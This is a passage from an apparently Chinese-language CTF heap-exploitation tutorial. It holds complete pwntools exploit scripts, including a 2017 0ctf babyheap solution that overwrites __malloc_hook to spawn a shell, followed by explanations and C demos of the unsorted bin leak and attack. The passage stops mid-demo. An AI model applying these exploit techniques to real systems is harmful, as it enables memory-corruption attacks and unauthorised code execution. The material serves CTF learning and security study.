punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    search<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">12</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    index_sentence<span class="token punctuation">(</span><span class="token string">'d'</span> <span class="token operator">*</span> <span class="token number">64</span><span class="token punctuation">)</span>    search<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    node <span class="token operator">=</span> <span class="token string">''</span>    node <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x400E90</span><span class="token punctuation">)</span>     node <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>     node <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x602028</span><span class="token punctuation">)</span>     node <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>     node <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00000000</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span> <span class="token builtin">len</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">40</span>    index_sentence<span class="token punctuation">(</span>node<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token punctuation">)</span>    search<span class="token punctuation">(</span><span class="token string">'Enter'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Found 64: '</span><span class="token punctuation">)</span>    leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> leak<span class="token keyword">def</span> <span class="token function">index_sentence</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">make_cycle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index_sentence<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">54</span> <span class="token operator">+</span> <span class="token string">' d'</span><span class="token punctuation">)</span>    index_sentence<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">54</span> <span class="token operator">+</span> <span class="token string">' d'</span><span class="token punctuation">)</span>    index_sentence<span class="token punctuation">(</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">54</span> <span class="token operator">+</span> <span class="token string">' d'</span><span class="token punctuation">)</span>    search<span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    search<span class="token punctuation">(</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">make_fake_chunk</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    index_sentence<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allocate_fake_chunk</span><span class="token punctuation">(</span>binsh_addr<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    index_sentence<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">56</span><span class="token punctuation">)</span>    index_sentence<span class="token punctuation">(</span><span class="token string">'B'</span><span class="token operator">*</span><span class="token number">56</span><span class="token punctuation">)</span>    buf <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">30</span>    buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>    buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>    buf <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>    buf <span class="token operator">=</span> buf<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">)</span>    index_sentence<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    stack_leak <span class="token operator">=</span> leak_stack<span class="token punctuation">(</span><span class="token punctuation">)</span>    stack_addr <span class="token operator">=</span> stack_leak <span class="token operator">+</span> <span class="token number">0x22</span> <span class="token operator">-</span> <span class="token number">8</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'stack leak: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack_leak<span class="token punctuation">)</span><span class="token punctuation">)</span>    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'stack addr: %s'</span> <span class="token operator">%</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_leak <span class="token operator">=</span> leak_libc<span class="token punctuation">(</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> libc_leak <span class="token operator">-</span> puts_offset    system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> system_offset    binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> binsh_offset    make_cycle<span class="token punctuation">(</span><span class="token punctuation">)</span>    make_fake_chunk<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span>    allocate_fake_chunk<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">,</span> system_addr<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">"linux"</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">allocate</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">fill</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>strlen<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>strlen<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">dump</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">leak_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># idx 0, 0x00</span>    allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># idx 1, 0x20</span>    allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># idx 2, 0x40</span>    allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># idx 3, 0x60</span>    allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>  <span class="token comment"># idx 4, 0x80</span><span class="token comment">#fastbin[0]->idx1->idx2->NULL</span>    free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>    fill<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    payload <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span>    fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># idx 1</span>    allocate<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span>  <span class="token comment"># idx 2</span>    payload <span class="token operator">=</span> <span class="token number">0x10</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span>    fill<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>    allocate<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>  <span class="token comment"># idx 5</span>    free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    dump<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Content: \n'</span><span class="token punctuation">)</span>    unsortedbin_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena <span class="token operator">=</span> unsortedbin_addr <span class="token operator">-</span> offset_unsortedbin_main_arena    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'main arena addr: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena<span class="token punctuation">)</span><span class="token punctuation">)</span>    main_arena_offset <span class="token operator">=</span> <span class="token number">0x3c4b20</span>    libc_base <span class="token operator">=</span> main_arena <span class="token operator">-</span> main_arena_offset    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc base addr: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>fake_chunk_addr <span class="token operator">=</span> main_arena <span class="token operator">-</span> <span class="token number">0x33</span>fake_chunk <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_chunk_addr<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>  <span class="token comment"># idx 4</span>allocate<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span>  <span class="token comment"># idx 6</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4526a</span>payload <span class="token operator">=</span> <span class="token number">0x13</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span>fill<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>allocate<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    leak_libc<span class="token punctuation">(</span><span class="token punctuation">)</span>    exp<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><h2 id="Unsorted-Bin"><a href="#Unsorted-Bin" class="headerlink" title="Unsorted Bin"></a>Unsorted Bin</h2><p><strong>来源：</strong></p><ol><li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE（fastbins的大小）（一般为0x80），就会被放到 unsorted bin 中。</li><li>释放一个不属于 fast bin 的 chunk，<strong>并且该 chunk 不和 top chunk 紧邻时</strong>，该 chunk 会被首先放到 unsorted bin 中。</li><li>当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话</li></ol><p><strong>使用：</strong></p><ol><li>Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，<strong>即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取</strong>。</li><li>在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。</li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Unsorted-Bin-的结构"><a href="#Unsorted-Bin-的结构" class="headerlink" title="Unsorted Bin 的结构"></a>Unsorted Bin 的结构</h3><p><code>Unsorted Bin</code> 在管理时为循环双向链表，若 <code>Unsorted Bin</code> 中有两个 <code>bin</code>，那么该链表结构如下</p><p><img src="https://ctf-wiki.org/pwn/linux/glibc-heap/figure/unsortedbins-struct.jpg" alt="img"></p><p>故在该链表中必有一个节点（不准确的说，是尾节点）的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。</p><h3 id="Leak-原理"><a href="#Leak-原理" class="headerlink" title="Leak 原理"></a>Leak 原理</h3><p>如果我们可以把正确的 <code>fd</code> 指针 leak 出来，就可以获得一个与 <code>main_arena</code> 有固定偏移的地址，这个偏移可以通过调试得出。而<code>main_arena</code> 是一个 <code>struct malloc_state</code> 类型的全局变量，是 <code>ptmalloc</code> 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 <code>.data</code> 或者 <code>.bss</code> 等段上，那么如果我们有进程所使用的 <code>libc</code> 的 <code>.so</code> 文件的话，我们就可以获得 <code>main_arena</code> 与 <code>libc</code> 基地址的偏移，实现对 <code>ASLR</code> 的绕过。</p><p>具体的偏移可以通过 __malloc_hook 直接算出：<code>main_arena</code> 和 <code>__malloc_hook</code> 的地址差是 0x10，而大多数的 libc 都可以直接查出 <code>__malloc_hook</code> 的地址，这样可以大幅减小工作量。以 pwntools 为例</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">main_arena_offset <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"__malloc_hook"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0x10</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就可以获得 <code>main_arena</code> 与基地址的偏移了。</p><h3 id="实现-Leak-的方法"><a href="#实现-Leak-的方法" class="headerlink" title="实现 Leak 的方法"></a>实现 Leak 的方法</h3><p>一般来说，要实现 leak，需要有 <code>UAF</code>，将一个 <code>chunk</code> 放入 <code>Unsorted Bin</code> 中后再打出其 <code>fd</code>。一般的笔记管理题都会有 <code>show</code> 的功能，对处于链表尾的节点 <code>show</code> 就可以获得 <code>libc</code> 的基地址了。</p><p>特别的，<code>CTF</code> 中的利用，堆往往是刚刚初始化的，所以 <code>Unsorted Bin</code> 一般都是干净的，当里面只存在一个 <code>bin</code> 的时候，该 <code>bin</code> 的 <code>fd</code> 和 <code>bk</code> 都会指向 <code>main_arena</code> 中。</p><p>另外，如果我们无法做到访问链表尾，但是可以访问链表头，那么在 32 位的环境下，对链表头进行 <code>printf</code> 等往往可以把 <code>fd</code> 和 <code>bk</code> 一起输出出来，这个时候同样可以实现有效的 leak。然而在 64 位下，由于高地址往往为 <code>\x00</code>，很多输出函数会被截断，这个时候可能就难以实现有效 leak。</p><p><strong>演示</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token operator">*</span> ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Unsorted bin</span>    <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 防止堆块并入Top chunk中</span>    <span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"&lt;main_arena+88> %p -- %p\n"</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ptr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Unsorted-Bin-Attack-原理"><a href="#Unsorted-Bin-Attack-原理" class="headerlink" title="Unsorted Bin Attack 原理"></a>Unsorted Bin Attack 原理</h2><p>在 glibc/malloc/malloc.c 中的 _int_malloc 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 bck-&gt;fd 的位置写入本 Unsorted Bin 的位置。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* remove from unsorted list */</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>bck<span class="token operator">-></span>fd <span class="token operator">!=</span> victim<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): corrupted unsorted chunks 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换而言之，如果控制了 bk 的值，就能将 unsorted_chunks (av) 写到任意地址。</p><h3 id="原理演示"><a href="#原理演示" class="headerlink" title="原理演示"></a>原理演示</h3><p><strong>源码</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> target_var <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The data on stack [%p]: %ld\n\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>target_var<span class="token punctuation">,</span> target_var<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//malloc an unsorted bin chunk</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"A chunk on the heap at: %p\n"</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Separate the top chunk</span>  <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//inserted in the unsorted bin</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Free p \np's bk == %p\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/*------------VULNERABILITY-----------*/</span>  p<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>target_var <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//change bk,and target==chunk's fd</span>  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"And now chunk's bk == %p\n\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token 